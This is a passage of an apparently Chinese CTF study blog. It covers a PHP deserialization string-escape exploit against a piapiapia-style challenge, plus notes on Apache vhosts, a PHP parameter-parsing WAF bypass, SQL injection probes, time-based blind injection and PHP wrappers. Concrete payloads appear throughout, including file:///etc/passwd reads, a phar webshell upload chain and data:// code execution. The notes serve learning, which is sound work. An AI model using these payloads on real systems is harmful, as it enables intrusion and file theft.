class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">update.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>阅读源码后发现其资料更新流程是这样的：<br>在update.php点击更新资料后，在本页面处理，经过正则表达式过滤后通过的话，在user类中的update_profile方法中执行序列化后的profile<br>$user-&gt;update_profile($username, serialize($profile));<br>跟进user-&gt;update_profile方法：<br>用户名和资料经过过滤器fileter过滤后直接丢给mysql更新,继续跟进filter<br>主要是正则替换。把危险字段替换为“hacker”。这里有问题。暂时不管，继续跟进。<br>顺利通过filter后则可顺利更新用户资料。<br>再看profile.php里面这句话:<br>$photo = base64_encode(file_get_contents($profile[‘photo’]));<br>file_get_contents 是不是想到了什么？伪协议？<br>我们想读取到的文件是config.php 因为里面已经提示了有flag字段。<br>接下来我们要做的是让file_get_contents()包含config.php这个文件<br>先自己尝试下替换文件名，失败了。<br>接下来考虑伪协议，也失败了。。<br>然后考虑反序列化的问题<br>首先明白什么是反序列化<br>个人理解反序列化就是把对象，变量，各种属性不一的文件通过一种形式的转换转换成字符串（序列化），并且还能通过该字符串还原该对象（反序列化）<br>一个例子就是ss导出配置的时候给他base64解密看看是不是序列化的思想呢2333<br>举个栗子</p><img src="http://cdn.polowong.top/static/images/uns2.jpg"><p>反序列化严格按照长度进行反序列化，如果长度改变的话可能反序列化失败。比如：</p><img src="http://cdn.polowong.top/static/images/uns3.jpg"><p>在反序列化之前，我把最后一个字符串加了一个d 但是前面的长度还是5没有变，所以反序列化失败了，报错。<br>还有一种情况：<br>通过自己构造的反序列化对象，可以修改对象的某些属性。<br>比如之前c的最后一个字符串为234，我们构造$c1=’a:3:{i:0;s:3:”123”;i:1;s:3:”abc”;i:2;s:5:”wdnmd”;}”;i:2;s:3:”234”;}’;<br>就把最后一个属性的值换成了wdnmd，后面原来的字符串会被忽略。起到了夹带私货的作用。</p><img src="http://cdn.polowong.top/static/images/uns4.jpg"><p>这道题我们想让photo的值为config.php,所以需要利用上面说的字符串逃逸的问题，将payload挤到后面去。<br>具体什么意思？<br>对nickname的内容进行构造，我们知道，序列化之后长度固定不变。就是S:后面的数字。但是问题就出现在他存在一个字符串替换，把where替换成hacker，使得字符串长度+1。那么问题来了，如何利用？<br>首先绕过正则表达式对nickename的判断，用数组就好。nickname[]<br>我们想传入的字符串为  “;}s:5:”photo”;s:10:”config.php”;}   总长度为34，所以我们需要写34个where加上我们想传入的字符串作为payload，总长度为204（包括34个where和想传入的字符串）<br>在经过序列化，过滤的过程中，所有的where被替换成和hacker，这样序列化后的s:204不变，nickname的值变成了34个hacker，并且成功的修改了photo的值为config.php<br>payload:wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}<br>注意：<br><strong>任何不正确的反序列化是会失败的。</strong><br>In the end:<br>php unserialize的问题有很多，我只是学习到了其中的一个，等学习到了其他的问题继续整理、巩固下来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于apache与php的理解</title>
      <link href="2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="apache与php"><a href="#apache与php" class="headerlink" title="apache与php"></a>apache与php</h2><p>当客户端请求<a href="http://www.test.com/1.php%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8Capache%E7%9B%91%E5%90%AC80%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%94%B6%E5%88%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E8%AF%B7%E6%B1%82%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AFPHP%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E8%AF%A5%E6%96%87%E4%BB%B6%E5%85%88%E7%BB%99PHP%E8%A7%A3%E9%87%8A%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%AE%8C%E4%B9%8B%E5%90%8E%E6%B8%B2%E6%9F%93%E6%88%90html%E7%BB%99apache%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8Capache%E5%86%8D%E8%BF%94%E5%9B%9E%E7%BB%99%E5%AE%A2%E6%88%B7%E7%AB%AF%E3%80%82">www.test.com/1.php的时候，apache监听80端口，收到客户端的请求后发现是PHP文件，将该文件先给PHP解释，解释完之后渲染成html给apache服务器，apache再返回给客户端。</a></p><h2 id="vhost与hosts文件"><a href="#vhost与hosts文件" class="headerlink" title="vhost与hosts文件"></a>vhost与hosts文件</h2><p>hosts文件在本机代表本机dns 格式 IP DOMAIN，位置/Windows/system32/drivers/etc/hosts文件在本机代表本机dns<br>vhost文件代表了apache配置的虚拟网站。即同一主机的多个网站，需要配置根目录，域名，端口等信息。</p><img src="http://cdn.polowong.top/static/images/vh1.jpg"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</span><br><span class="line">    DocumentRoot <span class="string">&quot;E:/phpstudy_pro/WWW/dura.box&quot;</span></span><br><span class="line">    ServerName dora.box</span><br><span class="line">    ServerAlias </span><br><span class="line">    FcgidInitialEnv PHPRC <span class="string">&quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts&quot;</span></span><br><span class="line">    AddHandler fcgid-script .php</span><br><span class="line">    FcgidWrapper <span class="string">&quot;E:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot;</span> .php</span><br><span class="line">  &lt;<span class="built_in">Directory</span> <span class="string">&quot;E:/phpstudy_pro/WWW/dura.box&quot;</span>&gt;</span><br><span class="line">      Options FollowSymLinks ExecCGI</span><br><span class="line">      AllowOverride All</span><br><span class="line">      Order allow,deny</span><br><span class="line">      Allow <span class="keyword">from</span> all</span><br><span class="line">      <span class="keyword">Require</span> all granted</span><br><span class="line">  DirectoryIndex index.php index.html <span class="built_in">error</span>/index.html</span><br><span class="line">  &lt;/<span class="built_in">Directory</span>&gt;</span><br><span class="line">  ErrorDocument <span class="number">400</span> /<span class="built_in">error</span>/<span class="number">400</span>.html</span><br><span class="line">  ErrorDocument <span class="number">403</span> /<span class="built_in">error</span>/<span class="number">403</span>.html</span><br><span class="line">  ErrorDocument <span class="number">404</span> /<span class="built_in">error</span>/<span class="number">404</span>.html</span><br><span class="line">  ErrorDocument <span class="number">500</span> /<span class="built_in">error</span>/<span class="number">500</span>.html</span><br><span class="line">  ErrorDocument <span class="number">501</span> /<span class="built_in">error</span>/<span class="number">501</span>.html</span><br><span class="line">  ErrorDocument <span class="number">502</span> /<span class="built_in">error</span>/<span class="number">502</span>.html</span><br><span class="line">  ErrorDocument <span class="number">503</span> /<span class="built_in">error</span>/<span class="number">503</span>.html</span><br><span class="line">  ErrorDocument <span class="number">504</span> /<span class="built_in">error</span>/<span class="number">504</span>.html</span><br><span class="line">  ErrorDocument <span class="number">505</span> /<span class="built_in">error</span>/<span class="number">505</span>.html</span><br><span class="line">  ErrorDocument <span class="number">506</span> /<span class="built_in">error</span>/<span class="number">506</span>.html</span><br><span class="line">  ErrorDocument <span class="number">507</span> /<span class="built_in">error</span>/<span class="number">507</span>.html</span><br><span class="line">  ErrorDocument <span class="number">510</span> /<span class="built_in">error</span>/<span class="number">510</span>.html</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的域名dura.box其实我并没有注册，我这样写只是为了便捷访问。修改本地dns文件，添加记录 127.0.0.1 dura.box 然后cmd ipconfig/flushdns刷新本地dns缓存<br>重启apache服务，下次访问dura.box的时候就相当于访问根目录为E:/phpstudy_pro/WWW/dura.box/的网站。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200410学习笔记</title>
      <link href="2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/10/20200410%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="今天睡了12个小时。。离谱儿。"><a href="#今天睡了12个小时。。离谱儿。" class="headerlink" title="今天睡了12个小时。。离谱儿。"></a>今天睡了12个小时。。离谱儿。</h1><p>整理一下这两天做的题以及学的内容吧 我这两天睡得这么久是真离谱！！</p><h2 id="php-strstr"><a href="#php-strstr" class="headerlink" title="php strstr()"></a>php strstr()</h2><p>strstr(str1,str2)<br>返回从str2第一次出现开始之后的内容（包括str2)<br>比如 strstr(“phpinput”,”in”)<br>– input</p><h2 id="php字符串解析bypass"><a href="#php字符串解析bypass" class="headerlink" title="php字符串解析bypass"></a>php字符串解析bypass</h2><p>前天做了个php字符串解析的问题（buuoj</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]; </span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]; </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123; </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>直接传num=phpinfo()的话是不行的，有waf。<br>waf的规则如果是规定num只能是数字的话，给num传个字母就白给了。<br>这里就用到了php字符串解析漏洞了。<br>参考链接<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a><br>传一个?%20num=phpinfo()的话，waf找不到num这个参数，而php还是可以把%20num识别成num的。所以可以顺利的到eval那。<br>payload: ?%20num=var_dump(scandir(chr(47))) //chr47是/ 代表根目录 找到flag文件 然后file_get_contents(dir+filename)进行读取即可。这里过滤了/，所以用chr(47)代替</p><h2 id="mysql-if"><a href="#mysql-if" class="headerlink" title="mysql if()"></a>mysql if()</h2><p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，<br>则返回expr3的值。<br>比如 if(2&gt;1,1,0)</p><h2 id="mysql-注释"><a href="#mysql-注释" class="headerlink" title="mysql 注释"></a>mysql 注释</h2><p>#或者– 如果使用–的话后面需要一个间隔符 否则的话会被识别为+号。比如–+ （在url中 +是空格的url编码）</p><img src="http://cdn.polowong.top/static/images/comm.jpg"><h2 id="sql注入整型、字符型判断"><a href="#sql注入整型、字符型判断" class="headerlink" title="sql注入整型、字符型判断"></a>sql注入整型、字符型判断</h2><p>参考链接：<a href="https://www.cnblogs.com/puhk/p/12674740.html">https://www.cnblogs.com/puhk/p/12674740.html</a><br>举例:<br><a href="http://xxx/xxx/Less-1/?id=1">http://xxx/xxx/Less-1/?id=1</a> and 1=1 –+<br>输入?id=1 and 1=1 –+正常，输入?id=1 and 1=2 –+报错，可判断为整型注入。<br><a href="http://xxx.xxx/Less-1/?id=1&#39;">http://xxx.xxx/Less-1/?id=1&#39;</a><br>输入?id=1’出现报错,输入?id=1’’正常，可判断为字符型注入。<br><a href="http://xxx.xxx/Less-1/?id=1&#39;">http://xxx.xxx/Less-1/?id=1&#39;</a> and 1=1 – -<br>输入?id=1’ and 1=1 – -正常，输入?id=1’ and 1=2 – -报错，可判断为字符型注入。 </p><h2 id="mysql盲注初步"><a href="#mysql盲注初步" class="headerlink" title="mysql盲注初步"></a>mysql盲注初步</h2><p>参考链接 <a href="https://www.anquanke.com/post/id/170626">https://www.anquanke.com/post/id/170626</a><br>盲注分为基于时间的盲注和基于bool的盲注。<br>基于时间的盲注就是根据判断条件返回是true还是false 进行能够判断的操作（比如sleep） 可以理解为一种fuzz。<br>if(substr(database(),1,1)==97,sleep(1),0) 可以写脚本跑出来数据库的名字等等<br>布尔盲注是根据结果返回值（对应true false ）判断需要找的字段 然后进行爆破</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200408学习笔记</title>
      <link href="2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/08/20200408%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><del>今天本来想晚上整理php伪协议的 但是早晨起晚了。。下午起晚了。。晚上弄实验报告的环境弄了一晚上。。太离谱了，明天再详细的写伪协议吧。</del><br><del>我今天也起晚了！！</del><br>废话少说 开始今天的php伪协议总结</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/0a8339fcc269">https://www.jianshu.com/p/0a8339fcc269</a></p><p>php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取源代码并进行base64编码输出。<br>eg：php://filter/convert.base64-encode/resource=xxx.php<br>php://input: 获取post data<br>file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。<br>eg：file:///etc/passwd<br>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。<br>nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.php<br>data://：需满足allow_url_fopen，allow_url_include同时开启才能使用，使用如下：<br>data://很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入<br>file.php?file=data://text/plain,<?php phpinfo()?><br>file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200406学习笔记</title>
      <link href="2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/04/06/20200406%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="今天又睡了老久。。晚上整理一下"><a href="#今天又睡了老久。。晚上整理一下" class="headerlink" title="今天又睡了老久。。晚上整理一下"></a>今天又睡了老久。。晚上整理一下</h2><p>其实今天整理这个一方面是不会，另一方面是看到心仪大学夏令营面试有问过这个问题（生日攻击），或许可能不会再问了，但知道总比不知道强！<br>一下内容除webshell和php外皆为生日攻击衍生出来的问题（对我来说没掌握的）<br>今日内容：MD5碰撞√，生日攻击√，哈希√，彩虹表√，盐√，webshell本质，php某方法√，幻数√，内存存储方式√<br>参考：<br><a href="https://www.zhihu.com/question/20820286">https://www.zhihu.com/question/20820286</a><br><a href="https://zhuanlan.zhihu.com/p/37165658">https://zhuanlan.zhihu.com/p/37165658</a><br><a href="https://blog.csdn.net/M_mamba/article/details/103405022">https://blog.csdn.net/M_mamba/article/details/103405022</a><br><a href="https://zhuanlan.zhihu.com/p/43994479">https://zhuanlan.zhihu.com/p/43994479</a><br><a href="https://www.jianshu.com/p/732d9d960411">https://www.jianshu.com/p/732d9d960411</a><br><a href="https://blog.csdn.net/blade2001/article/details/6341078">https://blog.csdn.net/blade2001/article/details/6341078</a></p><h2 id="hash"><a href="#hash" class="headerlink" 